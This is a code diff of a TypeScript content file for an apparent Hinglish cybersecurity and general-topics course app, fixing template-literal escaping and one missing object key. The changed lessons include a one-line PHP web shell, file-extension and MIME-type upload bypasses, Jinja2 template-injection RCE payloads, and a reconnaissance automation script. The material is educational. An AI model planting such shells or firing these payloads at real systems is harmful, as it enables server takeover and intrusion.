@@ -2483,7 +2483,7 @@ export const topicContent: Record<string, TopicContent> = {
     sections: [
       {
         heading: "📤 File Upload Vulnerabilities",
-        content: `File upload feature websites pe bahut common hai — aur bahut dangerous bhi:\n\n**Attack scenario:**\n1. Website pe profile photo upload feature hai\n2. Hacker .php file upload karta hai (web shell)\n3. Server bina check kiye PHP execute kar deta hai\n4. Hacker URL hit karta hai → server pe commands run!\n\n**MIME type bypasses:**\n\`\`\`\nOriginal: Content-Type: application/php\nBypass: Content-Type: image/jpeg  (change karo in Burp)\nServer validate kar sakta hai extension ya MIME — dono bypass ho sakte hain\n\`\`\`\n\n**Extension bypasses:**\n\`\`\`\nBlocked: .php\nTry: .php3 .php4 .php5 .phtml .pHp .PHP .php.jpg\n```\n\n**Web shell (PHP):**\n\`\`\`php\n<?php system($_GET['cmd']); ?>\n```\nSave as shell.php, upload karo, hit karo:\nhttp://target.com/uploads/shell.php?cmd=whoami\n→ www-data\nRCE (Remote Code Execution) mil gayi!`,
+        content: `File upload feature websites pe bahut common hai — aur bahut dangerous bhi:\n\n**Attack scenario:**\n1. Website pe profile photo upload feature hai\n2. Hacker .php file upload karta hai (web shell)\n3. Server bina check kiye PHP execute kar deta hai\n4. Hacker URL hit karta hai → server pe commands run!\n\n**MIME type bypasses:**\n\`\`\`\nOriginal: Content-Type: application/php\nBypass: Content-Type: image/jpeg  (change karo in Burp)\nServer validate kar sakta hai extension ya MIME — dono bypass ho sakte hain\n\`\`\`\n\n**Extension bypasses:**\n\`\`\`\nBlocked: .php\nTry: .php3 .php4 .php5 .phtml .pHp .PHP .php.jpg\n\`\`\`\n\n**Web shell (PHP):**\n\`\`\`php\n<?php system($_GET['cmd']); ?>\n\`\`\`\nSave as shell.php, upload karo, hit karo:\nhttp://target.com/uploads/shell.php?cmd=whoami\n→ www-data\nRCE (Remote Code Execution) mil gayi!`,
       },
       {
         heading: "🗂️ Path Traversal / Directory Traversal",
@@ -2546,7 +2546,7 @@ export const topicContent: Record<string, TopicContent> = {
       },
       {
         heading: "💉 SSTI — Server-Side Template Injection",
-        content: `SSTI = Template engine mein code inject karo → RCE possible:\n\n**Template engines:**\n• Jinja2 (Python/Flask)\n• Twig (PHP)\n• Freemarker (Java)\n• Smarty (PHP)\n\n**Detection:**\n\`\`\`\nInput mein test karo:\n{{7*7}} → 49 dikhne pe SSTI hai! (Jinja2)\n${7*7} → 49 (Twig)\n<%= 7*7 %> → 49 (ERB/Ruby)\n{7*7} → 49 (Smarty)\n\`\`\`\n\n**Jinja2 RCE:**\n\`\`\`python\n# Basic\n{{config.items()}}\n\n# RCE\n{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}\n\n# Via subclasses\n{{''.__class__.__mro__[1].__subclasses__()}}\n\`\`\`\n\n**PayloadsAllTheThings** GitHub repo — SSTI payloads ka collection!`,
+        content: `SSTI = Template engine mein code inject karo → RCE possible:\n\n**Template engines:**\n• Jinja2 (Python/Flask)\n• Twig (PHP)\n• Freemarker (Java)\n• Smarty (PHP)\n\n**Detection:**\n\`\`\`\nInput mein test karo:\n{{7*7}} → 49 dikhne pe SSTI hai! (Jinja2)\n\${7*7} → 49 (Twig)\n<%= 7*7 %> → 49 (ERB/Ruby)\n{7*7} → 49 (Smarty)\n\`\`\`\n\n**Jinja2 RCE:**\n\`\`\`python\n# Basic\n{{config.items()}}\n\n# RCE\n{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}\n\n# Via subclasses\n{{''.__class__.__mro__[1].__subclasses__()}}\n\`\`\`\n\n**PayloadsAllTheThings** GitHub repo — SSTI payloads ka collection!`,
       },
       {
         heading: "📄 XXE — XML External Entity",
@@ -4278,7 +4278,7 @@ export const topicContent: Record<string, TopicContent> = {
       },
       {
         heading: "🔍 SAST & SCA",
-        content: `**SAST (Static Application Security Testing):**\nCode analyze karo bina run kiye:\n\n**Semgrep — Free, fast:**\n\`\`\`bash\npip install semgrep\n\n# Auto-detect language + rules\nsemgrep --config auto .\n\n# Python injection rules\nsemgrep --config p/python-security .\n\n# Custom rule:\ncat > rule.yml << 'EOF'\nrules:\n  - id: hardcoded-secret\n    patterns:\n      - pattern: $KEY = \"...\"\n    message: Potential hardcoded secret\n    severity: WARNING\nEOF\nsemgrep --config rule.yml .\n\`\`\`\n\n**SCA (Software Composition Analysis):**\nDependencies ke vulnerabilities check karo:\n\n\`\`\`bash\n# OWASP Dependency-Check\nDC_VERSION=\"latest\"\ncurl -L -o dependency-check.zip https://github.com/jeremylong/DependencyCheck/releases/latest/download/dependency-check-${DC_VERSION}-release.zip\nbin/dependency-check.sh --project \"MyApp\" --scan .\n\n# Snyk — fast, free tier:\nsnyk test  # Node.js\nsnyk test --all-projects  # Multiple languages\n\n# Python pip-audit:\npip install pip-audit\npip-audit -r requirements.txt\n\`\`\``,
+        content: `**SAST (Static Application Security Testing):**\nCode analyze karo bina run kiye:\n\n**Semgrep — Free, fast:**\n\`\`\`bash\npip install semgrep\n\n# Auto-detect language + rules\nsemgrep --config auto .\n\n# Python injection rules\nsemgrep --config p/python-security .\n\n# Custom rule:\ncat > rule.yml << 'EOF'\nrules:\n  - id: hardcoded-secret\n    patterns:\n      - pattern: $KEY = \"...\"\n    message: Potential hardcoded secret\n    severity: WARNING\nEOF\nsemgrep --config rule.yml .\n\`\`\`\n\n**SCA (Software Composition Analysis):**\nDependencies ke vulnerabilities check karo:\n\n\`\`\`bash\n# OWASP Dependency-Check\nDC_VERSION=\"latest\"\ncurl -L -o dependency-check.zip https://github.com/jeremylong/DependencyCheck/releases/latest/download/dependency-check-\${DC_VERSION}-release.zip\nbin/dependency-check.sh --project \"MyApp\" --scan .\n\n# Snyk — fast, free tier:\nsnyk test  # Node.js\nsnyk test --all-projects  # Multiple languages\n\n# Python pip-audit:\npip install pip-audit\npip-audit -r requirements.txt\n\`\`\``,
       },
       {
         heading: "🌐 DAST & Secrets Management",
@@ -4741,7 +4741,7 @@ export const topicContent: Record<string, TopicContent> = {
       },
       {
         heading: "🛠️ Recon Pipeline",
-        content: `**Complete recon automation script:**\n\`\`\`bash\n#!/bin/bash\nTARGET=$1\nOUTDIR=\"recon_${TARGET}\"\nmkdir -p $OUTDIR\n\necho \"[+] Subdomain Enumeration...\"\nsubfinder -d $TARGET -o $OUTDIR/subs_passive.txt\namass enum -d $TARGET -o $OUTDIR/subs_amass.txt\nassetfinder --subs-only $TARGET >> $OUTDIR/subs_passive.txt\ncat $OUTDIR/subs_passive.txt $OUTDIR/subs_amass.txt | sort -u > $OUTDIR/all_subs.txt\n\necho \"[+] DNS Resolution...\"\nmassdns -r resolvers.txt -t A -o S $OUTDIR/all_subs.txt > $OUTDIR/resolved.txt\ncat $OUTDIR/resolved.txt | grep -v NXDOMAIN | awk '{print $1}' | sed 's/\\.$//' > $OUTDIR/live_subs.txt\n\necho \"[+] HTTP Probing...\"\nhttpx -l $OUTDIR/live_subs.txt -o $OUTDIR/live_http.txt -tech-detect -status-code -title\n\necho \"[+] Screenshot...\"\ngowitness scan file -f $OUTDIR/live_http.txt -s $OUTDIR/screenshots/\n\necho \"[+] Vulnerability Scan...\"\nnuclei -l $OUTDIR/live_http.txt -o $OUTDIR/nuclei_results.txt -severity critical,high\n\necho \"[*] Done! Results in $OUTDIR/\"\n\`\`\``,
+        content: `**Complete recon automation script:**\n\`\`\`bash\n#!/bin/bash\nTARGET=$1\nOUTDIR=\"recon_\${TARGET}\"\nmkdir -p $OUTDIR\n\necho \"[+] Subdomain Enumeration...\"\nsubfinder -d $TARGET -o $OUTDIR/subs_passive.txt\namass enum -d $TARGET -o $OUTDIR/subs_amass.txt\nassetfinder --subs-only $TARGET >> $OUTDIR/subs_passive.txt\ncat $OUTDIR/subs_passive.txt $OUTDIR/subs_amass.txt | sort -u > $OUTDIR/all_subs.txt\n\necho \"[+] DNS Resolution...\"\nmassdns -r resolvers.txt -t A -o S $OUTDIR/all_subs.txt > $OUTDIR/resolved.txt\ncat $OUTDIR/resolved.txt | grep -v NXDOMAIN | awk '{print $1}' | sed 's/\\.$//' > $OUTDIR/live_subs.txt\n\necho \"[+] HTTP Probing...\"\nhttpx -l $OUTDIR/live_subs.txt -o $OUTDIR/live_http.txt -tech-detect -status-code -title\n\necho \"[+] Screenshot...\"\ngowitness scan file -f $OUTDIR/live_http.txt -s $OUTDIR/screenshots/\n\necho \"[+] Vulnerability Scan...\"\nnuclei -l $OUTDIR/live_http.txt -o $OUTDIR/nuclei_results.txt -severity critical,high\n\necho \"[*] Done! Results in $OUTDIR/\"\n\`\`\``,
       },
       {
         heading: "📡 Advanced Recon Techniques",
@@ -5060,7 +5060,7 @@ export const topicContent: Record<string, TopicContent> = {
     ],
   },
 
-  // Keep existing health-06 entry
+  "health-06": {
     title: "Nutrition & Brain Foods",
     image: "https://images.unsplash.com/photo-1512621776951-a57141f2eefd?w=900&fit=crop&auto=format",
     tagline: "Brain ko fuel do sahi tarike se — food aur productivity connection!",
